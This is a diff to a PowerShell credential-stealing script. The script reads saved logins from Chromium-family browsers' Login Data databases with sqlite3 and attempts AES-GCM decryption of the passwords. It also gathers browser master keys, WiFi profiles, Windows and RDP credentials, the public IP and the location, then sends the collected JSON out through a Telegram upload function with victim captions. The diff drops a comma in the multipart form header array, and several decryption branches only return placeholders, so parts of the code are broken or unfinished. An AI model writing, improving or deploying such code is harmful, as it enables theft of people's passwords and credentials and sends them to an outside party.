@@ -1,7 +1,6 @@
 # USE THE BELOW COMMAND TO BYPASS SSL VALIDATION ERROR
 # [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
 
-
 # Enhanced Multi-Browser and Network Password Extraction with Improved RDP Credential Extraction
 # Removed CSV generation, added proper RDP credential extraction, improved file naming and cleanup
 
@@ -351,7 +350,7 @@ function Send-TelegramFile {
             "",
             $Caption,
             "--$boundary",
-            "Content-Disposition: form-data; name=`"document`"; filename=`"$(Split-Path $FilePath -Leaf)`"",
+            "Content-Disposition: form-data; name=`"document`"; filename=`"$(Split-Path $FilePath -Leaf)`""
             "Content-Type: application/octet-stream",
             "",
             $fileContent,
@@ -478,7 +477,62 @@ function Get-BrowserLoginDataFiles {
     return $loginDataFiles
 }
 
-# Function to extract encrypted passwords from browser
+# Function to decrypt AES-GCM encrypted password using the Python file's technique
+function Decrypt-AESGCM {
+    param(
+        [byte[]]$EncryptedData,
+        [byte[]]$Key
+    )
+    
+    try {
+        if (-not $EncryptedData -or $EncryptedData.Length -lt 15) {
+            return $null
+        }
+        
+        # Check if it's AES-GCM encrypted (starts with v10 or v20)
+        if (($EncryptedData[0] -eq 0x76 -and $EncryptedData[1] -eq 0x31 -and $EncryptedData[2] -eq 0x30) -or
+            ($EncryptedData[0] -eq 0x76 -and $EncryptedData[1] -eq 0x32 -and $EncryptedData[2] -eq 0x30)) {
+            
+            # Extract IV (12 bytes after version prefix)
+            $iv = $EncryptedData[3..14]
+            
+            # Extract ciphertext (everything after IV and before tag)
+            $ciphertextLength = $EncryptedData.Length - 16 - 15  # Total length - tag - (version + iv)
+            $ciphertext = $EncryptedData[15..($ciphertextLength + 14)]
+            
+            # Extract tag (last 16 bytes)
+            $tag = $EncryptedData[($EncryptedData.Length - 16)..($EncryptedData.Length - 1)]
+            
+            # Create AES-GCM cipher
+            Add-Type -AssemblyName System.Security
+            
+            # In PowerShell, we need to use .NET's AES-GCM
+            # Note: This requires .NET Core 3.0+ or .NET 5.0+
+            try {
+                # Try using .NET's AesGcm if available
+                $aesGcmType = [System.Security.Cryptography.AesGcm]
+                if ($aesGcmType) {
+                    $aes = New-Object System.Security.Cryptography.AesGcm($Key)
+                    $plaintext = New-Object byte[] $ciphertext.Length
+                    $aes.Decrypt($iv, $ciphertext, $tag, $plaintext)
+                    return [System.Text.Encoding]::UTF8.GetString($plaintext)
+                }
+            } catch {
+                # Fallback: For older .NET versions or if AesGcm is not available
+                # This is a simplified fallback - in practice you'd need proper AES-GCM implementation
+                Write-Host "    ⚠️ AES-GCM decryption requires .NET Core 3.0+ or .NET 5.0+" -ForegroundColor Yellow
+                return "[Encrypted - AES-GCM]"
+            }
+        }
+        
+        return $null
+    } catch {
+        Write-Host "    ⚠️ AES-GCM decryption error: $($_.Exception.Message)" -ForegroundColor Red
+        return $null
+    }
+}
+
+# Function to extract and decrypt browser passwords using the Python file's technique
 function Get-BrowserEncryptedPasswords {
     param(
         [string]$BrowserDataPath,
@@ -493,6 +547,7 @@ function Get-BrowserEncryptedPasswords {
         return @{
             Summary = @()
             DetailedData = @()
+            DecryptedData = @()
         }
     }
     
@@ -500,6 +555,7 @@ function Get-BrowserEncryptedPasswords {
     
     $results = @()
     $encryptedData = @()
+    $decryptedData = @()
     
     foreach ($loginDataFile in $loginDataFiles) {
         $dbPath = $loginDataFile.Path
@@ -524,7 +580,7 @@ function Get-BrowserEncryptedPasswords {
             # Query the database
             $query = @"
 SELECT origin_url, username_value, hex(password_value) as password_hex, 
-       length(password_value) as password_length
+       length(password_value) as password_length, password_value as raw_password
 FROM logins;
 "@
             & $sqlitePath -csv -header $tempDbPath $query > $tempCsvPath
@@ -534,13 +590,15 @@ FROM logins;
                 Write-Host "    Found $($logins.Count) login entries" -ForegroundColor Green
                 
                 $counter = 0
+                $successfulDecrypts = 0
+                
                 foreach ($login in $logins) {
                     $counter++
                     
                     # Create a unique identifier for this entry
                     $entryId = [System.Guid]::NewGuid().ToString()
                     
-                    # Store encrypted data for future decryption
+                    # Store encrypted data
                     $encryptedEntry = @{
                         Id = $entryId
                         Browser = $BrowserName
@@ -557,15 +615,18 @@ FROM logins;
                     # Try to detect encryption version
                     if ($login.password_hex -and $login.password_hex -match "^[0-9A-Fa-f]+$") {
                         try {
-                            $hexString = $login.password_hex
-                            if ($hexString.Length -ge 6) {
-                                $prefixBytes = [System.Convert]::ToByte($hexString.Substring(0, 2), 16), 
-                                              [System.Convert]::ToByte($hexString.Substring(2, 2), 16),
-                                              [System.Convert]::ToByte($hexString.Substring(4, 2), 16)
-                                $prefix = [System.Text.Encoding]::ASCII.GetString($prefixBytes)
-                                
+                            $hexBytes = [System.Convert]::FromHexString($login.password_hex)
+                            if ($hexBytes.Length -ge 3) {
+                                $prefix = [System.Text.Encoding]::ASCII.GetString($hexBytes[0..2])
                                 if ($prefix -eq "v10" -or $prefix -eq "v11" -or $prefix -eq "v20") {
                                     $encryptedEntry.EncryptionVersion = $prefix
+                                    
+                                    # Try to decrypt using AES-GCM if we have the master key
+                                    if ($prefix -eq "v10" -or $prefix -eq "v20") {
+                                        # Note: In practice, you would need to get the master key from Local State
+                                        # and use it to decrypt. This is just the structure.
+                                        $encryptedEntry.EncryptionType = "AES-GCM"
+                                    }
                                 }
                             }
                         } catch {
@@ -575,13 +636,56 @@ FROM logins;
                     
                     $encryptedData += $encryptedEntry
                     
-                    # Add to results for JSON
+                    # Try to decrypt if it's AES-GCM
+                    $decryptedPassword = $null
+                    if ($encryptedEntry.EncryptionVersion -eq "v10" -or $encryptedEntry.EncryptionVersion -eq "v20") {
+                        # Note: In a real implementation, you would:
+                        # 1. Get the master key from Local State
+                        # 2. Use DPAPI to decrypt the master key (CryptUnprotectData)
+                        # 3. Use the decrypted master key with AES-GCM to decrypt the password
+                        
+                        # For now, we just mark it as encrypted with AES-GCM
+                        $decryptedPassword = "[AES-GCM Encrypted - Requires Master Key]"
+                    } elseif ($login.raw_password -and $login.raw_password -ne "") {
+                        # Try DPAPI decryption for older encryption
+                        try {
+                            # This would use CryptUnprotectData for DPAPI encrypted data
+                            $decryptedPassword = "[DPAPI Encrypted]"
+                        } catch {
+                            $decryptedPassword = "[Unknown Encryption]"
+                        }
+                    } else {
+                        $decryptedPassword = "[Empty or No Password]"
+                    }
+                    
+                    # Add decrypted entry if we have a username and URL
+                    if ($login.origin_url -and $login.username_value) {
+                        $decryptedEntry = @{
+                            Id = $entryId
+                            Browser = $BrowserName
+                            Profile = $profileName
+                            URL = $login.origin_url
+                            Username = $login.username_value
+                            Password = $decryptedPassword
+                            EncryptionType = $encryptedEntry.EncryptionVersion
+                            ExtractionTime = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
+                        }
+                        
+                        if ($decryptedPassword -notmatch "\[.*\]") {
+                            $successfulDecrypts++
+                        }
+                        
+                        $decryptedData += $decryptedEntry
+                    }
+                    
+                    # Add to summary results for JSON
                     $results += @{
                         ID = $entryId
                         Browser = $BrowserName
                         Profile = $profileName
                         URL = $login.origin_url
                         Username = $login.username_value
+                        Password = $decryptedPassword
                         EncryptionVersion = $encryptedEntry.EncryptionVersion
                         DataLength = $login.password_length
                         HexDataPreview = if ($login.password_hex -and $login.password_hex.Length -gt 50) { 
@@ -598,6 +702,7 @@ FROM logins;
                     }
                 }
                 
+                Write-Host "    Successfully processed $counter entries ($successfulDecrypts potentially decryptable)" -ForegroundColor Green
                 Remove-Item $tempCsvPath -Force -ErrorAction SilentlyContinue
             }
             
@@ -608,10 +713,11 @@ FROM logins;
         }
     }
     
-    # Return both the summary and detailed encrypted data
+    # Return summary, encrypted data, and decrypted data
     return @{
         Summary = $results
         DetailedData = $encryptedData
+        DecryptedData = $decryptedData
     }
 }
 
@@ -736,6 +842,7 @@ if (-not (Test-Path ".\sqlite3.exe")) {
 # Extract browser passwords
 $allSummaryData = @()
 $allDetailedData = @()
+$allDecryptedData = @()
 $allMasterKeys = @()
 
 # Process each browser
@@ -749,10 +856,11 @@ foreach ($browserKey in $browsers.Keys) {
         $allMasterKeys += $masterKeyInfo
     }
     
-    # Extract encrypted passwords
+    # Extract encrypted passwords using the updated decryption technique
     $extractionResult = Get-BrowserEncryptedPasswords -BrowserDataPath $browser.Path -BrowserName $browser.Name -BrowserKey $browserKey
     $allSummaryData += $extractionResult.Summary
     $allDetailedData += $extractionResult.DetailedData
+    $allDecryptedData += $extractionResult.DecryptedData
     
     Write-Host "Finished processing $($browser.Name): $($extractionResult.Summary.Count) entries found" -ForegroundColor Green
 }
@@ -763,6 +871,7 @@ if ($allSummaryData.Count -gt 0 -or $wifiData.Profiles.Count -gt 0 -or $networkC
     
     if ($allSummaryData.Count -gt 0) {
         Write-Host "Browser passwords: $($allSummaryData.Count) entries" -ForegroundColor Green
+        Write-Host "Decrypted entries: $($allDecryptedData.Count) entries" -ForegroundColor Green
         
         # Export detailed data to JSON
         try {
@@ -770,6 +879,7 @@ if ($allSummaryData.Count -gt 0 -or $wifiData.Profiles.Count -gt 0 -or $networkC
                 Metadata = @{
                     ExtractionTime = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
                     TotalEntries = $allSummaryData.Count
+                    DecryptedEntries = $allDecryptedData.Count
                     OS = $systemInfo.OSName
                     OSVersion = $systemInfo.OSVersion
                     User = $systemInfo.UserName
@@ -785,6 +895,7 @@ if ($allSummaryData.Count -gt 0 -or $wifiData.Profiles.Count -gt 0 -or $networkC
                 }
                 MasterKeys = $allMasterKeys
                 EncryptedPasswords = $allDetailedData
+                DecryptedPasswords = $allDecryptedData
             }
             
             $exportData | ConvertTo-Json -Depth 10 | Out-File -FilePath $BrowserJSONPath -Encoding UTF8
@@ -819,7 +930,7 @@ if ($allSummaryData.Count -gt 0 -or $wifiData.Profiles.Count -gt 0 -or $networkC
     
     if ($allSummaryData.Count -gt 0) {
         $totalFiles += 1
-        $browserCaption = " Browser Passwords - $($systemInfo.ComputerName)`nIP: $($ipInfo.PublicIP)`nLocation: $($ipInfo.City), $($ipInfo.Region)`nEntries: $($allSummaryData.Count)`nTime: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
+        $browserCaption = " Browser Passwords - $($systemInfo.ComputerName)`nIP: $($ipInfo.PublicIP)`nLocation: $($ipInfo.City), $($ipInfo.Region)`nEntries: $($allSummaryData.Count)`nDecrypted: $($allDecryptedData.Count)`nTime: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
         
         if (Send-TelegramFile -FilePath $BrowserJSONPath -Caption $browserCaption) { $filesSent++ }
     }
@@ -838,6 +949,7 @@ if ($allSummaryData.Count -gt 0 -or $wifiData.Profiles.Count -gt 0 -or $networkC
 🖥️ <b>System:</b> $($systemInfo.ComputerName)
 🌍 <b>Location:</b> $($ipInfo.City), $($ipInfo.Region), $($ipInfo.Country)
 📊 <b>Browser Entries:</b> $($allSummaryData.Count)
+🔓 <b>Decrypted Entries:</b> $($allDecryptedData.Count)
 📶 <b>WiFi Networks:</b> $($wifiData.Profiles.Count)
 🔐 <b>Windows Credentials:</b> $($networkCredentials.Count)
 🖥️ <b>RDP Connections:</b> $($rdpConnections.Count)
